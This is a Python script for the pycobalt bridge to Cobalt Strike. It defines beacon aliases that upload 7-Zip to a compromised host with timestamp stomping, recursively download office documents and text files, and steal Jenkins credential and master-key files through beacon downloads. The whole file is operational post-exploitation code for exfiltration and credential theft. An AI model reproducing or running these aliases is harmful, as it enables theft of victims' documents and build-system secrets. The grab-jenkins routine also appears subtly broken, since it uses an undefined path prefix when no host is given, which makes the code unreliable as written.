#!/usr/bin/env python3

import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import os
import re
import textwrap
import datetime
import collections

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks
import pycobalt.helpers as helpers
from pycobalt.helpers import powershell_quote

_uploaded = None

@aliases.alias('7z-init', 'Upload 7zip')
def _(bid):
    global _uploaded

    temp = helpers.guess_temp(bid)
    dest = r'{}\7za.exe'.format(temp)
    helpers.upload_to(bid, utils.basedir('tools/7za.exe'), dest)
    helpers.explorer_stomp(bid, '7za.exe')
    _uploaded = dest

@aliases.alias('7z', 'Run 7zip')
def _(bid, *args):
    global _uploaded

    if not _uploaded:
        aggressor.berror('Run 7z-init first')
        return

    line = ' '.join(args)
    aggressor.btask(bid, 'Tasked beacon to run 7zip command: {}'.format(line))
    aggressor.bpowerpick(bid, "echo '7zip starting'; {} {} ; echo '7zip finished';".format(_uploaded, line), silent=True)

@aliases.alias('7z-stop', 'Remove 7zip')
def _(bid):
    global _uploaded

    if not _uploaded:
        aggressor.berror('Run 7z-init first')
        return

    aggressor.brm(bid, _uploaded)
    _uploaded = None

@aliases.alias('grab-docs', 'Grab common documents')
def _(bid, directory, *extensions):

    if not extensions:
        extensions = ['doc', 'docx', 'docm',
                      'xls', 'xlsx', 'xlsm',
                      'ppt', 'pptx', 'pub',
                      'pdf', 'rtf', 'vsd',
                      'txt']

    def callback(path):
        ext = path.split('.')[-1]
        if ext in extensions:
            aggressor.bdownload(bid, path)

    aggressor.btask(bid, 'Tasked beacon to recursively download files with extensions: ' + ', '.join(extensions))
    helpers.recurse_ls(bid, directory, callback)

@aliases.alias('dlr', 'Recursively download files in directories')
def _(bid, *directories):
    def callback(path):
        aggressor.bdownload(bid, path)

    for directory in directories:
        aggressor.btask(bid, 'Tasked beacon to recurse {} for files to download'.format(directory))
        helpers.recurse_ls(bid, directory, callback)

@aliases.alias('dl', 'Download files')
def _(bid, *files):
    for fname in files:
        aggressor.bdownload(bid, fname)

@aliases.alias('dli', 'Download specific files in directory')
def _(bid, directory, *files):
    for fname in files:
        full = r'{}\{}'.format(directory, fname)
        aggressor.bdownload(bid, full)

@aliases.alias('dla', 'Non-recursively download files in directories')
def _(bid, *directories):
    def callback(path):
        aggressor.bdownload(bid, path)

    for directory in directories:
        aggressor.btask(bid, 'Tasked beacon to look in {} for files to download'.format(directory))
        helpers.recurse_ls(bid, directory, callback, depth=1)

@aliases.alias('grab-jenkins', 'Grab Jenkins files')
def _(bid, host=None):
    jenkins_dir = r'C:\program files (x86)\jenkins'
    files = ['secret.key', 'queue.xml', 'config.xml', 'jenkins.xml',
            'github-plugin-configuration.xml',
            'credentials.xml',
            'scriptApproval.xml', 'scm-sync-configuration.xml', 
            'secrets/master.key', 'secrets/hudson.util.Secret']

    if host:
        prefix = helpers.path_to_unc(host, jenkins_dir)

    aggressor.btask(bid, 'Tasked beacon to download files in {}: {}'.format(prefix, ', '.join(files)))
    for fname in files:
        path = r'{}\{}'.format(prefix, fname)
        aggressor.bdownload(bid, path, silent=True)

# Get download lpaths
@commands.command('lpaths')
def _(out=None):
    downloads = aggressor.downloads()

    lines = []
    for download in downloads:
        lpath = download['lpath']
        path = r'{}{}'.format(download['path'], download['name'])

        lines.append('{}\t{}'.format(path, lpath))

    if out:
        with open(out, 'w+') as fp:
            fp.writelines(lines)
    else:
        for line in lines:
            aggressor.println(line)

